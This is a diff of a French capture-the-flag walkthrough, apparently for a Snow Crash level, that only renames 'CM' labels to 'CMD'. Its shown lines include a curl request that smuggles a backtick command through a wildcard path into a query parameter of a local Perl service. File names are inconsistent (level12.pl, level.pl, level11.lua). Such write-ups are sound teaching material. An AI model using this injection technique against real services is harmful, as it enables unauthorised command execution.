@@ -5,7 +5,7 @@
 1. On regarde les fichiers mis à notre disposition, on
    a :
    --------------------------------------------------------
-   CM : ls
+   CMD : ls
    OUTPUT : level12.pl
 
 2. On cat le contenu du script level.pl. On constate que 
@@ -19,7 +19,7 @@
    egrep : c'est notamment ici que l'on peut exploiter une
    fail d'injection.
    --------------------------------------------------------
-   CM : cat level11.lua
+   CMD : cat level11.lua
    OUTPUT : [...]
             # localhost:4646
             [...]
@@ -41,7 +41,7 @@
    sont pas importante du fait du regex 1 spécifié 
    ci-dessus) 
    --------------------------------------------------------
-   CM : curl 'localhost:4646?x=`/*/EXPLOIT`&y='
+   CMD : curl 'localhost:4646?x=`/*/EXPLOIT`&y='
    OUTPUT : Broadcast Message from flag12@Snow
             (somewhere) at 14:44 ...
 
